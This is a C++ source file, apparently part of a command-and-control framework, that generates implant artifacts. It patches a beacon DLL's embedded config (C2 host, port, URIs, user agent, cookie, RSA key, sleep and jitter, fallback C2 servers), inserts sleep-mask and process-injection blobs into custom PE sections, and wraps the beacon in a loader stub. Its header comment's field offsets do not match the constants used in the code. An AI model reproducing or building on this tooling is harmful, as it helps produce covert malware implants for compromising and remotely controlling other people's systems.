#include "PatchBeacon.hpp"
#include <cstring>
#include <algorithm>

// The beacon DLL's BeaconState is placed in the .data section at a well-known
// layout.  artifact-gen locates it by scanning for 32 zero bytes (the default
// listener_key) immediately followed by the default host string L"127.0.0.1".
//
// Layout of BeaconState (must match beacon/core/beacon.h exactly):
//   uint8_t  listener_key[32]      → offset 0
//   wchar_t  host[128]             → offset 32    (256 bytes)
//   uint16_t port                  → offset 288
//   wchar_t  uri_checkin[128]      → offset 290
//   wchar_t  uri_task[128]         → offset 546
//   wchar_t  uri_post[128]         → offset 802
//   wchar_t  user_agent[256]       → offset 1058  (512 bytes)
//   wchar_t  metadata_cookie[64]   → offset 1570  (128 bytes)
//   uint8_t  spawn_to[128]         → offset 1698
//   uint8_t  rsa_pub_blob[540]     → offset 1826  (BEACON_RSA_PUB_MAX)
//   uint32_t rsa_pub_len           → offset 2366
//   // runtime fields start here (not patched, except sleep/jitter)
//   char     beacon_id[33]         → offset 2370
//   uint8_t  session_key[32]       → offset 2403
//   uint32_t sleep_ms              → offset 2435
//   uint8_t  jitter_pct            → offset 2439
//   uint8_t  authenticated, checkin_done, quit

namespace co2h::artgen {

namespace {

// Copy a wide string into a fixed-size UTF-16LE field, zero-padded.
// Always writes 2 bytes per character regardless of platform wchar_t size,
// because the beacon expects UTF-16LE.
void copy_wfield(uint8_t* dst, size_t field_chars, const std::wstring& src) {
    size_t n = std::min(src.size(), field_chars - 1);
    std::memset(dst, 0, field_chars * 2);  // 2 bytes per char (UTF-16LE)
    for (size_t i = 0; i < n; ++i) {
        uint16_t ch = static_cast<uint16_t>(src[i]);
        dst[i * 2]     = static_cast<uint8_t>(ch & 0xFF);
        dst[i * 2 + 1] = static_cast<uint8_t>(ch >> 8);
    }
}

// Offset constants matching beacon.h layout under #pragma pack(1).
// (BeaconState is packed so we can compute offsets by linear sum.)
constexpr size_t OFF_KEY        =    0;  // uint8[32]
constexpr size_t OFF_HOST       =   32;  // wchar[128]  = 256 bytes
constexpr size_t OFF_PORT       =  288;  // uint16_t
constexpr size_t OFF_CHECKIN    =  290;  // wchar[128]
constexpr size_t OFF_TASK       =  546;  // wchar[128]
constexpr size_t OFF_POST       =  802;  // wchar[128]
constexpr size_t OFF_UA         = 1058;  // wchar[256]  = 512 bytes
constexpr size_t OFF_COOKIE     = 1570;  // wchar[64]   = 128 bytes
constexpr size_t OFF_SPAWNTO    = 1698;  // uint8[128]
constexpr size_t OFF_RSA_PUB    = 1826;  // uint8[BEACON_RSA_PUB_MAX = 540]
constexpr size_t RSA_PUB_MAX    =  540;
constexpr size_t OFF_RSA_PUB_LEN= 2366;  // uint32_t
constexpr size_t OFF_PARENT_ID  = 2370;  // char[33]
// runtime fields (not patched by artifact-gen, except sleep/jitter):
constexpr size_t OFF_BEACON_ID  = 2403;  // char[33]
constexpr size_t OFF_SESSION_KEY= 2436;  // uint8[32]
constexpr size_t OFF_SLEEP_MS   = 2468;  // uint32_t
constexpr size_t OFF_JITTER     = 2472;  // uint8_t
// auth(1) + checkin_done(1) + quit(1) = 3 bytes → 2476
constexpr size_t OFF_WATERMARK  = 2476;  // uint32_t — reserved
// Fallback C2 channels (после watermark)
constexpr size_t OFF_FALLBACK   = 2480;  // FallbackSlot[4], каждый 518 байт
constexpr size_t FALLBACK_SLOT_SIZE = 518;
// FallbackSlot layout: host[128](256B) + port(2B) + uri_checkin[128](256B) + active(1B) + pad(3B)
constexpr size_t FB_OFF_HOST    = 0;
constexpr size_t FB_OFF_PORT    = 256;
constexpr size_t FB_OFF_URI     = 258;
constexpr size_t FB_OFF_ACTIVE  = 514;
constexpr size_t OFF_FB_COUNT   = 4552;  // uint8_t fallback_count
constexpr size_t BEACON_STATE_SIZE = 4556;

// Find the offset of BeaconState in the image by searching for 32 zero bytes
// (listener_key) followed by "1\x002\x007\x00.\x000\x00.\x000\x00.\x001\x00"
// (L"127.0.0.1" in UTF-16LE).
size_t find_beacon_state(const std::vector<uint8_t>& img) {
    // Pattern: 32×0x00 (key), then L"127.0.0.1" (18 bytes UTF-16LE)
    const uint8_t host_pattern[] = {
        '1',0,'2',0,'7',0,'.',0,'0',0,'.',0,'0',0,'.',0,'1',0, 0,0
    };
    constexpr size_t KEY_SIZE = 32;

    for (size_t i = 0; i + BEACON_STATE_SIZE < img.size(); ++i) {
        // Check key is all zero
        bool key_zero = true;
        for (size_t k = 0; k < KEY_SIZE; ++k) {
            if (img[i + k]) { key_zero = false; break; }
        }
        if (!key_zero) continue;

        // Check host starts with L"127.0.0.1\0"
        if (std::memcmp(img.data() + i + KEY_SIZE, host_pattern, sizeof(host_pattern)) == 0) {
            return i;
        }
    }
    return std::string::npos;
}

} // namespace

size_t patch_beacon_dll(std::vector<uint8_t>& img, const ListenerConfig& cfg) {
    size_t off = find_beacon_state(img);
    if (off == std::string::npos) return std::string::npos;

    uint8_t* base = img.data() + off;

    // listener_key
    std::memcpy(base + OFF_KEY, cfg.listener_key.data(), 32);

    // host
    copy_wfield(base + OFF_HOST, 128, cfg.host);

    // port (little-endian uint16)
    base[OFF_PORT]   = (uint8_t)(cfg.port & 0xFF);
    base[OFF_PORT+1] = (uint8_t)(cfg.port >> 8);

    // URIs
    copy_wfield(base + OFF_CHECKIN, 128, cfg.uri_checkin);
    copy_wfield(base + OFF_TASK,    128, cfg.uri_task);
    copy_wfield(base + OFF_POST,    128, cfg.uri_post);

    // User-Agent and cookie
    copy_wfield(base + OFF_UA,     256, cfg.user_agent);
    copy_wfield(base + OFF_COOKIE,  64, cfg.cookie);

    // sleep_ms and jitter (little-endian uint32 + uint8)
    uint32_t sl = cfg.sleep_ms;
    base[OFF_SLEEP_MS]   = (uint8_t)(sl & 0xFF);
    base[OFF_SLEEP_MS+1] = (uint8_t)((sl >> 8)  & 0xFF);
    base[OFF_SLEEP_MS+2] = (uint8_t)((sl >> 16) & 0xFF);
    base[OFF_SLEEP_MS+3] = (uint8_t)((sl >> 24) & 0xFF);
    base[OFF_JITTER]     = cfg.jitter_pct;

    // parent_id (ASCII hex string, null-terminated, empty = root beacon)
    std::memset(base + OFF_PARENT_ID, 0, 33);
    if (cfg.parent_id[0]) {
        size_t plen = std::strlen(cfg.parent_id);
        if (plen > 32) plen = 32;
        std::memcpy(base + OFF_PARENT_ID, cfg.parent_id, plen);
    }

    // RSA public-key blob (optional). Empty → beacon falls back to listener_key.
    if (!cfg.rsa_pub_blob.empty()) {
        if (cfg.rsa_pub_blob.size() > RSA_PUB_MAX) return false;
        std::memset(base + OFF_RSA_PUB, 0, RSA_PUB_MAX);
        std::memcpy(base + OFF_RSA_PUB,
                    cfg.rsa_pub_blob.data(),
                    cfg.rsa_pub_blob.size());
        uint32_t pl = (uint32_t)cfg.rsa_pub_blob.size();
        base[OFF_RSA_PUB_LEN]   = (uint8_t)(pl & 0xFF);
        base[OFF_RSA_PUB_LEN+1] = (uint8_t)((pl >> 8)  & 0xFF);
        base[OFF_RSA_PUB_LEN+2] = (uint8_t)((pl >> 16) & 0xFF);
        base[OFF_RSA_PUB_LEN+3] = (uint8_t)((pl >> 24) & 0xFF);
    } else {
        // Make sure rsa_pub_len = 0 even if the input image had stale bytes.
        base[OFF_RSA_PUB_LEN]   = 0;
        base[OFF_RSA_PUB_LEN+1] = 0;
        base[OFF_RSA_PUB_LEN+2] = 0;
        base[OFF_RSA_PUB_LEN+3] = 0;
    }

    // Fallback C2 channels
    // Обнуляем все слоты, потом заполняем активные.
    std::memset(base + OFF_FALLBACK, 0, FALLBACK_MAX_SLOTS * FALLBACK_SLOT_SIZE);
    base[OFF_FB_COUNT] = 0;
    base[OFF_FB_COUNT + 1] = 0;  // _fb_pad[0]
    base[OFF_FB_COUNT + 2] = 0;  // _fb_pad[1]
    base[OFF_FB_COUNT + 3] = 0;  // _fb_pad[2]

    size_t fb_count = std::min(cfg.fallbacks.size(), (size_t)FALLBACK_MAX_SLOTS);
    for (size_t i = 0; i < fb_count; ++i) {
        uint8_t* slot = base + OFF_FALLBACK + i * FALLBACK_SLOT_SIZE;
        const auto& fb = cfg.fallbacks[i];

        copy_wfield(slot + FB_OFF_HOST, 128, fb.host);

        slot[FB_OFF_PORT]     = (uint8_t)(fb.port & 0xFF);
        slot[FB_OFF_PORT + 1] = (uint8_t)(fb.port >> 8);

        copy_wfield(slot + FB_OFF_URI, 128, fb.uri_checkin);

        slot[FB_OFF_ACTIVE] = 1;
    }
    base[OFF_FB_COUNT] = (uint8_t)fb_count;

    return off;
}

// ---- PE section lookup helper --------------------------------------------
//
// Парсит PE-заголовки, находит секцию по имени, возвращает PointerToRawData.
// Возвращает npos если секция не найдена.

static size_t find_pe_section(const std::vector<uint8_t>& image,
                              const char* name, size_t* out_raw_size)
{
    if (image.size() < 0x40) return std::string::npos;
    if (image[0] != 'M' || image[1] != 'Z') return std::string::npos;

    uint32_t e_lfanew = 0;
    std::memcpy(&e_lfanew, image.data() + 0x3C, 4);
    if (e_lfanew + 24 > image.size()) return std::string::npos;
    if (std::memcmp(image.data() + e_lfanew, "PE\0\0", 4) != 0)
        return std::string::npos;

    uint32_t coff_off = e_lfanew + 4;
    uint16_t num_sections = 0;
    std::memcpy(&num_sections, image.data() + coff_off + 2, 2);
    uint16_t opt_hdr_size = 0;
    std::memcpy(&opt_hdr_size, image.data() + coff_off + 16, 2);

    uint32_t sec_table = coff_off + 20 + opt_hdr_size;
    char target[8] = {};
    for (int i = 0; i < 8 && name[i]; ++i) target[i] = name[i];

    for (uint16_t i = 0; i < num_sections; ++i) {
        uint32_t sec_off = sec_table + i * 40;
        if (sec_off + 40 > image.size()) break;

        if (std::memcmp(image.data() + sec_off, target, 8) == 0) {
            uint32_t raw_size = 0, raw_ptr = 0;
            std::memcpy(&raw_size, image.data() + sec_off + 16, 4);
            std::memcpy(&raw_ptr,  image.data() + sec_off + 20, 4);
            if (out_raw_size) *out_raw_size = raw_size;
            return raw_ptr;
        }
    }
    return std::string::npos;
}

// ---- Sleep mask patching -------------------------------------------------

size_t patch_sleep_mask(std::vector<uint8_t>& image,
                        const std::vector<uint8_t>& mask_blob)
{
    if (mask_blob.size() > SLPMSK_SLOT_SIZE)
        return std::string::npos;

    size_t raw_size = 0;
    size_t raw_ptr = find_pe_section(image, ".slpmsk", &raw_size);
    if (raw_ptr == std::string::npos)
        return std::string::npos;
    if (raw_ptr + SLPMSK_SLOT_SIZE > image.size())
        return std::string::npos;

    // Overwrite slot: blob + zero padding.
    std::memset(image.data() + raw_ptr, 0, SLPMSK_SLOT_SIZE);
    std::memcpy(image.data() + raw_ptr, mask_blob.data(), mask_blob.size());
    return raw_ptr;
}

// ---- Process inject kit patching -----------------------------------------

size_t patch_inject_kit(std::vector<uint8_t>& image,
                        const std::vector<uint8_t>& inject_blob)
{
    if (inject_blob.size() > INJKIT_SLOT_SIZE)
        return std::string::npos;

    size_t raw_size = 0;
    size_t raw_ptr = find_pe_section(image, ".injkit", &raw_size);
    if (raw_ptr == std::string::npos)
        return std::string::npos;
    if (raw_ptr + INJKIT_SLOT_SIZE > image.size())
        return std::string::npos;

    // Overwrite slot: blob + zero padding.
    std::memset(image.data() + raw_ptr, 0, INJKIT_SLOT_SIZE);
    std::memcpy(image.data() + raw_ptr, inject_blob.data(), inject_blob.size());
    return raw_ptr;
}

// ---- Artifact-Kit stub wrapping -----------------------------------------
// Ищем в stub PE-файле секцию .co2pay по PE-таблице секций (как и .slpmsk/.injkit),
// затем внутри секции - сигнатуру "CO2HPAYL". Найдя её, переписываем 4-байтное поле
// size и копируем тело DLL. Двойной поиск (сначала секция, потом магия внутри)
// защищает от ложного срабатывания на тех же байтах в других секциях.

size_t wrap_in_stub(std::vector<uint8_t>& stub_image,
                    const std::vector<uint8_t>& beacon_dll)
{
    if (beacon_dll.size() > ARTIFACT_MAX_PAYLOAD)
        return std::string::npos;

    size_t raw_size = 0;
    size_t raw_ptr = find_pe_section(stub_image, ".co2pay", &raw_size);
    if (raw_ptr == std::string::npos)
        return std::string::npos;
    if (raw_size < ARTIFACT_HEADER_LEN + beacon_dll.size())
        return std::string::npos;

    // Ищем магию внутри секции (она лежит в самом начале по разметке g_payload[]).
    static const uint8_t MAGIC[ARTIFACT_MAGIC_LEN] = {
        'C','O','2','H','P','A','Y','L'
    };
    size_t magic_off = std::string::npos;
    size_t scan_end = raw_ptr + raw_size - ARTIFACT_MAGIC_LEN;
    for (size_t p = raw_ptr; p <= scan_end; ++p) {
        if (std::memcmp(stub_image.data() + p, MAGIC, ARTIFACT_MAGIC_LEN) == 0) {
            magic_off = p;
            break;
        }
    }
    if (magic_off == std::string::npos)
        return std::string::npos;

    // Записываем size (LE uint32) сразу после магии.
    uint32_t sz = static_cast<uint32_t>(beacon_dll.size());
    std::memcpy(stub_image.data() + magic_off + ARTIFACT_MAGIC_LEN, &sz, 4);

    // Копируем тело DLL в payload-зону.
    std::memcpy(stub_image.data() + magic_off + ARTIFACT_HEADER_LEN,
                beacon_dll.data(), beacon_dll.size());
    return magic_off;
}

} // namespace co2h::artgen
